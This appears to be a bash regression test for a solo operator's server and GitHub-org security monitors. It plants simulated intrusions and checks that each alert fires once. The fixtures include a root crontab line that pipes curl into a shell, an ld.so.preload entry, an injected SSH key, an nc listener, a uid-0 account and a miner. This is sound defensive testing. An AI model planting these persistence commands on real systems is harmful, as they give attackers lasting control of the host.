#!/usr/bin/env bash
# Regression test for the threat-detection checks — runs anywhere, no box.
#
# The checks ship as heredocs inside install-security-watch.sh (and lean on
# lib-alert.sh from install-host-alerts.sh). This extracts those exact payloads
# — no second copy that can drift — plants a fake /etc under $SEC_PREFIX, stubs
# every external tool on PATH, and asserts the one property that matters for a
# solo operator's phone: a check speaks ONCE when something changes and never
# when nothing did. A detector that repeats itself gets muted; a detector that
# stays silent on a real change is worse than none.
#
# Usage: scripts/hetzner/test-security-check.sh
set -euo pipefail

HERE=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
SRC="$HERE/install-security-watch.sh"
LIBSRC="$HERE/install-host-alerts.sh"
for f in "$SRC" "$LIBSRC"; do [ -f "$f" ] || { echo "missing $f"; exit 1; }; done
for t in jq python3 comm sha256sum; do command -v "$t" >/dev/null || { echo "missing tool $t"; exit 1; }; done

TMP=$(mktemp -d)
trap 'rm -rf "$TMP"' EXIT
export MON="$TMP/mon"; mkdir -p "$MON/state" "$TMP/bin"
export SEC_PREFIX="$TMP/root"
export ALERT_LOG="$TMP/alerts.log"; : > "$ALERT_LOG"
export ALERT_DEDUPE_SEC=0

sed -n "/<<'LIB'\$/,/^LIB\$/p" "$LIBSRC" | sed '1d;$d' > "$MON/lib-alert.sh"
sed -n "/<<'SC'\$/,/^SC\$/p"   "$SRC"    | sed '1d;$d' > "$MON/security-check.sh"
sed -n "/<<'GHC'\$/,/^GHC\$/p" "$SRC"    | sed '1d;$d' > "$MON/github-security-check.sh"
for f in lib-alert.sh security-check.sh github-security-check.sh; do
  [ -s "$MON/$f" ] || { echo "FAIL: could not extract $f"; exit 1; }
done
chmod +x "$MON/security-check.sh" "$MON/github-security-check.sh"

# ── Fake filesystem the integrity/account checks read ─────────────────────────
R="$SEC_PREFIX"
mkdir -p "$R/etc/ssh/sshd_config.d" "$R/etc/sudoers.d" "$R/root/.ssh" "$R/home/ubuntu/.ssh" "$R/etc/pam.d" \
         "$R/etc/caddy/apps.d" "$R/etc/systemd/system" "$R/usr/local/bin" "$R/opt/monitoring" "$R/opt/backups" "$R/var/run"
echo "PasswordAuthentication no" > "$R/etc/ssh/sshd_config"
echo "root ALL=(ALL) ALL" > "$R/etc/sudoers"
echo "ssh-ed25519 AAAAkey1 george" > "$R/root/.ssh/authorized_keys"
echo "ssh-ed25519 AAAAkey2 ci" > "$R/home/ubuntu/.ssh/authorized_keys"
echo "root:*:1::::::" > "$R/etc/shadow"
printf 'root:x:0:0:root:/root:/bin/bash\nubuntu:x:1000:1000::/home/ubuntu:/bin/bash\nnobody:x:65534:65534::/:/usr/sbin/nologin\n' > "$R/etc/passwd"
printf 'sudo:x:27:ubuntu\ndocker:x:109:ubuntu\n' > "$R/etc/group"
echo "RESTIC_REPOSITORY=b2:test" > "$R/opt/backups/restic.env"

# ── Tool stubs (each driven by env so a test can move the world) ──────────────
cat > "$TMP/bin/logger" <<'STUB'
#!/usr/bin/env bash
printf '%s\n' "${*: -1}" >> "$ALERT_LOG"
STUB
cat > "$TMP/bin/ufw" <<'STUB'
#!/usr/bin/env bash
[ -n "${UFW_DOWN:-}" ] && echo "Status: inactive" || echo "Status: active"
STUB
cat > "$TMP/bin/systemctl" <<'STUB'
#!/usr/bin/env bash
# is-active --quiet <svc>: fail only for services listed in $DOWN_SVCS
case " ${DOWN_SVCS:-} " in *" ${*: -1} "*) exit 3;; esac; exit 0
STUB
cat > "$TMP/bin/sshd" <<'STUB'
#!/usr/bin/env bash
printf 'passwordauthentication %s\npermitrootlogin prohibit-password\npubkeyauthentication yes\npermitemptypasswords no\n' "${SSHD_PW:-no}"
STUB
cat > "$TMP/bin/ss" <<'STUB'
#!/usr/bin/env bash
echo 'tcp   LISTEN 0 4096   0.0.0.0:22   0.0.0.0:* users:(("sshd",pid=1,fd=3))'
echo 'tcp   LISTEN 0 4096 127.0.0.1:5432 0.0.0.0:* users:(("postgres",pid=2,fd=7))'
[ -n "${EXTRA_PORT:-}" ] && echo "tcp   LISTEN 0 4096   0.0.0.0:${EXTRA_PORT}   0.0.0.0:* users:((\"nc\",pid=9,fd=3))"
exit 0
STUB
cat > "$TMP/bin/docker" <<'STUB'
#!/usr/bin/env bash
echo "supabase-db postgres:17"; [ -n "${EXTRA_CONTAINER:-}" ] && echo "$EXTRA_CONTAINER evil:latest"; exit 0
STUB
cat > "$TMP/bin/journalctl" <<'STUB'
#!/usr/bin/env bash
# Like the real thing with --show-cursor: the lines, then "-- cursor: <c>".
[ -n "${JOURNAL_FILE:-}" ] && cat "$JOURNAL_FILE"
case " $* " in *" --show-cursor "*) echo "-- cursor: s=stub;i=$(date +%s%N)";; esac; exit 0
STUB
cat > "$TMP/bin/curl" <<'STUB'
#!/usr/bin/env bash
echo '{"actions":["4.148.0.0/16","2603:1030::/32"]}'
STUB
cat > "$TMP/bin/restic" <<'STUB'
#!/usr/bin/env bash
printf '[{"time":"%s","paths":["/opt/backups/pg"]}]\n' "${RESTIC_TIME:-$(date -u +%Y-%m-%dT%H:%M:%SZ)}"
STUB
# A planted /proc: pid 1 is a normal binary; a test adds pid 4242 executing from /tmp.
export SEC_PROC="$TMP/proc"; mkdir -p "$SEC_PROC/1"; ln -sfn /usr/bin/bash "$SEC_PROC/1/exe"
cat > "$TMP/bin/ps" <<'STUB'
#!/usr/bin/env bash
echo "  1 systemd"; [ -n "${MINER:-}" ] && echo "777 $MINER"; exit 0
STUB
cat > "$TMP/bin/find" <<'STUB'
#!/usr/bin/env bash
# Only the setuid walk is faked; lib-alert's dedupe-stamp expiry `find` is a no-op here.
case " $* " in *" -perm "*) [ -n "${SETUID_NEW:-}" ] && echo "$SETUID_NEW"; echo "/usr/bin/sudo";; esac; exit 0
STUB
# gh: canned JSON per endpoint under $GH_DIR/<endpoint with / and ? mangled>.json, real jq applies --jq.
cat > "$TMP/bin/gh" <<'STUB'
#!/usr/bin/env bash
ep=""; filter="."
while [ $# -gt 0 ]; do case "$1" in --jq) filter="$2"; shift;; --paginate|api) ;; -*) ;; *) [ -z "$ep" ] && ep="$1";; esac; shift; done
f="$GH_DIR/$(printf '%s' "${ep%%\?*}" | tr '/' '_').json"
[ -f "$f" ] || exit 1
# A token without admin:org gets 403 on the actions policy: gh prints the error body to stdout and exits 1.
case "$ep" in *actions/permissions*) [ -n "${GH_NOADMIN:-}" ] && { echo '{"message":"You must be an org admin"}'; exit 1; };; esac
jq -r "$filter" "$f"
STUB
chmod +x "$TMP/bin/"*
export PATH="$TMP/bin:$PATH"

pass=0; fail=0
ok()   { pass=$((pass+1)); echo "  ok   $1"; }
bad()  { fail=$((fail+1)); echo "  FAIL $1"; echo "       alerts so far:"; sed 's/^/         /' "$ALERT_LOG"; }
delivered() { grep -c "^$1" "$ALERT_LOG" || true; }   # lines that reached _alert_deliver (not the dry-run/suppressed notes)
count() { grep -c -- "$1" "$ALERT_LOG" || true; }
run() { "$MON/security-check.sh" >/dev/null 2>&1 || { echo "  security-check exited $?"; }; }
reset_log() { : > "$ALERT_LOG"; }

echo "security-check.sh"
# Seed: George's home IP has logged in before.
JF="$TMP/journal.txt"; echo "Accepted publickey for ubuntu from 198.51.100.1 port 5 ssh2: ED25519 SHA256:x" > "$JF"
JOURNAL_FILE="$JF" run
[ "$(wc -l < "$ALERT_LOG")" -eq 0 ] && ok "first run seeds every baseline silently" || bad "first run must not alert"
[ -f "$MON/state/security/seeded" ] && ok "seeded stamp written" || bad "seeded stamp missing"
grep -qx "198.51.100.1" "$MON/state/security/ssh-known-ips" && ok "known SSH IPs seeded from history" || bad "known IPs not seeded"

: > "$JF"; JOURNAL_FILE="$JF" run
[ "$(wc -l < "$ALERT_LOG")" -eq 0 ] && ok "steady state is silent" || bad "steady state alerted"

UFW_DOWN=1 run; UFW_DOWN=1 run
[ "$(count 'FIREWALL DOWN')" -eq 1 ] && ok "firewall down: one message across two ticks" || bad "firewall down message count $(count 'FIREWALL DOWN')"
run; [ "$(count 'RECOVERED: FIREWALL DOWN')" -eq 1 ] && ok "firewall back: one recovery" || bad "no recovery for ufw"

reset_log; DOWN_SVCS="fail2ban" run
[ "$(count 'GUARD DOWN: fail2ban')" -eq 1 ] && ok "fail2ban down is reported" || bad "fail2ban down missed"
run

reset_log; SSHD_PW=yes run; SSHD_PW=yes run
[ "$(count 'SSHD DRIFT')" -eq 1 ] && ok "sshd password-auth drift: one message" || bad "sshd drift count $(count 'SSHD DRIFT')"
run

reset_log; echo "ssh-ed25519 AAAAevil attacker" >> "$R/root/.ssh/authorized_keys"; run
[ "$(count 'SENSITIVE FILE')" -eq 1 ] && grep -q "authorized_keys" "$ALERT_LOG" && ok "authorized_keys edit is named" || bad "authorized_keys edit missed"
run; [ "$(count 'SENSITIVE FILE')" -eq 1 ] && ok "same edit is not repeated next tick" || bad "file change repeated"

reset_log; echo "evil" > "$R/etc/ld.so.preload"; echo "* * * * * root curl x|sh" > "$R/etc/crontab"; run
[ "$(count 'SENSITIVE FILE')" -eq 1 ] && grep -q "2 SENSITIVE" "$ALERT_LOG" && ok "two changes in one tick are one grouped message" || bad "grouping failed"

reset_log; EXTRA_PORT=4444 run; EXTRA_PORT=4444 run
[ "$(count 'NEW PORT')" -eq 1 ] && grep -q "tcp:4444 nc" "$ALERT_LOG" && ok "new internet-facing port named with its process, once" || bad "new port count $(count 'NEW PORT')"
run   # port gone: silent
[ "$(count 'NEW PORT')" -eq 1 ] && ok "port closing is silent" || bad "port closing alerted"

reset_log; printf 'sudo:x:27:ubuntu,mallory\ndocker:x:109:ubuntu\n' > "$R/etc/group"; run
[ "$(count 'NEW PRIVILEGED ACCOUNT')" -eq 1 ] && grep -q "group-sudo:mallory" "$ALERT_LOG" && ok "new sudoer is named" || bad "new sudoer missed"
reset_log; echo "mallory:x:0:0::/root:/bin/bash" >> "$R/etc/passwd"; run
grep -q "uid0:mallory" "$ALERT_LOG" && ok "second uid-0 account is reported" || bad "uid0 missed"

reset_log; echo "Accepted publickey for root from 4.148.7.7 port 1 ssh2: ED25519 SHA256:y" > "$JF"; JOURNAL_FILE="$JF" run
[ "$(count 'SSH LOGIN')" -eq 0 ] && ok "login from a GitHub Actions range is not news" || bad "GitHub runner login alerted"
echo "Accepted publickey for ubuntu from 198.51.100.1 port 1 ssh2: ED25519 SHA256:y" > "$JF"; JOURNAL_FILE="$JF" run
[ "$(count 'SSH LOGIN')" -eq 0 ] && ok "login from a known IP is not news" || bad "known IP login alerted"
echo "Accepted publickey for root from 203.0.113.9 port 1 ssh2: ED25519 SHA256:z" > "$JF"; JOURNAL_FILE="$JF" run; JOURNAL_FILE="$JF" run
[ "$(count 'SSH LOGIN as root from 203.0.113.9')" -eq 1 ] && ok "login from a never-seen IP: exactly one message" || bad "new IP login count $(count 'SSH LOGIN')"
echo "Accepted password for ubuntu from 198.51.100.1 port 1 ssh2" > "$JF"; JOURNAL_FILE="$JF" run
[ "$(count 'SSH PASSWORD LOGIN')" -eq 1 ] && ok "a password login alerts even from a known IP" || bad "password login missed"
: > "$JF"

reset_log; mkdir -p "$SEC_PROC/4242"; ln -sfn /tmp/.x/kthreadd "$SEC_PROC/4242/exe"; run; run
[ "$(count 'SUSPICIOUS PROCESS')" -eq 1 ] && grep -q "/tmp/.x/kthreadd" "$ALERT_LOG" && ok "process executing from /tmp: one message" || bad "tmp process count $(count 'SUSPICIOUS PROCESS')"
rm -rf "$SEC_PROC/4242"
reset_log; MINER=xmrig run
grep -q "xmrig" "$ALERT_LOG" && ok "known miner name is reported" || bad "miner missed"

reset_log; EXTRA_CONTAINER=cryptojack run; EXTRA_CONTAINER=cryptojack run
[ "$(count 'NEW CONTAINER')" -eq 1 ] && ok "new container: one message" || bad "container count $(count 'NEW CONTAINER')"
run

reset_log; rm -f "$MON/state/security/hourly_setuid"; SETUID_NEW=/usr/local/bin/rootme run
grep -q "NEW SETUID BINARY: /usr/local/bin/rootme" "$ALERT_LOG" && ok "new setuid binary is named" || bad "setuid missed"
run; [ "$(count 'SETUID')" -eq 1 ] && ok "setuid walk is hourly, not every tick" || bad "setuid re-alerted"

reset_log; rm -f "$MON/state/security/hourly_restic"; RESTIC_TIME="$(date -u -d '3 days ago' +%Y-%m-%dT%H:%M:%SZ)" run
grep -q "OFFSITE BACKUP STALE" "$ALERT_LOG" && ok "stale offsite backup is reported" || bad "stale backup missed"
rm -f "$MON/state/security/hourly_restic"; run
[ "$(count 'RECOVERED: OFFSITE BACKUP STALE')" -eq 1 ] && ok "fresh snapshot recovers" || bad "backup recovery missing"

reset_log; touch -d '9 days ago' "$R/var/run/reboot-required"; run; run
[ "$(count 'REBOOT PENDING')" -eq 1 ] && ok "week-old reboot-required: one message" || bad "reboot count $(count 'REBOOT PENDING')"

echo "github-security-check.sh"
export GH_DIR="$TMP/gh"; mkdir -p "$GH_DIR"; export GH_ORG=testorg
echo '{"login":"testorg"}' > "$GH_DIR/orgs_testorg.json"
echo '[]' > "$GH_DIR/repos_testorg_site_secret-scanning_alerts.json"
echo '[]' > "$GH_DIR/repos_testorg_vault_secret-scanning_alerts.json"
echo '[]' > "$GH_DIR/orgs_testorg_dependabot_alerts.json"
echo '[{"name":"site","private":false,"archived":false,"security_and_analysis":{"secret_scanning":{"status":"enabled"}}},{"name":"vault","private":true,"archived":false,"security_and_analysis":{"secret_scanning":{"status":"disabled"}}}]' > "$GH_DIR/orgs_testorg_repos.json"
echo '[{"login":"george"}]' > "$GH_DIR/orgs_testorg_members.json"
echo '[]' > "$GH_DIR/orgs_testorg_outside_collaborators.json"
echo '{"installations":[{"app_slug":"claude"}]}' > "$GH_DIR/orgs_testorg_installations.json"
echo '[{"id":1,"title":"deploy"}]' > "$GH_DIR/repos_testorg_site_keys.json"
echo '[]' > "$GH_DIR/repos_testorg_vault_keys.json"
echo '{"allowed_actions":"selected"}' > "$GH_DIR/orgs_testorg_actions_permissions.json"
reset_log; "$MON/github-security-check.sh" >/dev/null 2>&1
[ "$(wc -l < "$ALERT_LOG")" -eq 0 ] && ok "first run seeds silently" || bad "first run alerted"
"$MON/github-security-check.sh" >/dev/null 2>&1
[ "$(wc -l < "$ALERT_LOG")" -eq 0 ] && ok "steady state is silent" || bad "steady state alerted"

echo '[{"number":7,"secret_type_display_name":"Stripe Live Key","html_url":"https://x/7"}]' > "$GH_DIR/repos_testorg_site_secret-scanning_alerts.json"
rm -f "$GH_DIR/repos_testorg_vault_secret-scanning_alerts.json"   # vault: scanning unavailable → 404 → skipped, not "empty"
"$MON/github-security-check.sh" >/dev/null 2>&1; "$MON/github-security-check.sh" >/dev/null 2>&1
[ "$(count 'SECRET IN REPO: site')" -eq 1 ] && grep -q "Stripe Live Key" "$ALERT_LOG" && ok "new secret-scanning alert: one message, names repo and type" || bad "secret alert count $(count 'SECRET IN REPO')"

reset_log; echo '[{"repository":{"name":"site"},"number":3,"dependency":{"package":{"name":"next"}}}]' > "$GH_DIR/orgs_testorg_dependabot_alerts.json"
"$MON/github-security-check.sh" >/dev/null 2>&1
grep -q "1 NEW CRITICAL DEPENDENCY ALERT(S): site:next" "$ALERT_LOG" && ok "new critical dependency alert names repo:package" || bad "critical dep missed"

reset_log; echo '[{"name":"site","private":false,"archived":false,"security_and_analysis":{"secret_scanning":{"status":"enabled"}}},{"name":"vault","private":false,"archived":false,"security_and_analysis":{"secret_scanning":{"status":"enabled"}}}]' > "$GH_DIR/orgs_testorg_repos.json"
"$MON/github-security-check.sh" >/dev/null 2>&1
grep -q "REPO NOW PUBLIC: vault" "$ALERT_LOG" && ok "private repo turning public is reported" || bad "public flip missed"

reset_log; echo '[{"login":"george"},{"login":"intruder"}]' > "$GH_DIR/orgs_testorg_members.json"
"$MON/github-security-check.sh" >/dev/null 2>&1
grep -q "NEW ACCESS TO THE ORG: member:intruder" "$ALERT_LOG" && ok "new org member is named" || bad "new member missed"

reset_log; echo '[{"id":1,"title":"deploy"},{"id":2,"title":"backdoor"}]' > "$GH_DIR/repos_testorg_site_keys.json"
"$MON/github-security-check.sh" >/dev/null 2>&1
grep -q "NEW DEPLOY KEY: site:2:backdoor" "$ALERT_LOG" && ok "new deploy key is named" || bad "deploy key missed"

reset_log; echo '{"allowed_actions":"all"}' > "$GH_DIR/orgs_testorg_actions_permissions.json"
"$MON/github-security-check.sh" >/dev/null 2>&1; "$MON/github-security-check.sh" >/dev/null 2>&1
[ "$(count 'ACTIONS POLICY LOOSENED')" -eq 1 ] && ok "actions allowlist loosened: one message" || bad "actions policy count $(count 'ACTIONS POLICY')"

reset_log; GH_NOADMIN=1 "$MON/github-security-check.sh" >/dev/null 2>&1
[ "$(count 'ACTIONS POLICY')" -eq 0 ] && ok "a 403 on the actions policy is skipped, never read as a value" || bad "403 was reported as a policy change"
reset_log; rm -f "$GH_DIR/orgs_testorg_members.json"
"$MON/github-security-check.sh" >/dev/null 2>&1
[ "$(count 'NEW ACCESS')" -eq 0 ] && [ -s "$MON/state/security/gh-people" ] && ok "a failed members call keeps the baseline and stays silent" || bad "failed call wiped the baseline or alerted"
echo '[{"login":"george"},{"login":"intruder"}]' > "$GH_DIR/orgs_testorg_members.json"
"$MON/github-security-check.sh" >/dev/null 2>&1
[ "$(count 'NEW ACCESS')" -eq 0 ] && ok "and the next good read is not a flood of 'new'" || bad "flood after transient failure"

reset_log; rm -f "$GH_DIR/orgs_testorg.json"
"$MON/github-security-check.sh" >/dev/null 2>&1
grep -q "GITHUB CHECK BLIND" "$ALERT_LOG" && ok "a dead gh login is itself reported" || bad "blind check silent"

echo; echo "$pass passed, $fail failed"
[ "$fail" -eq 0 ]
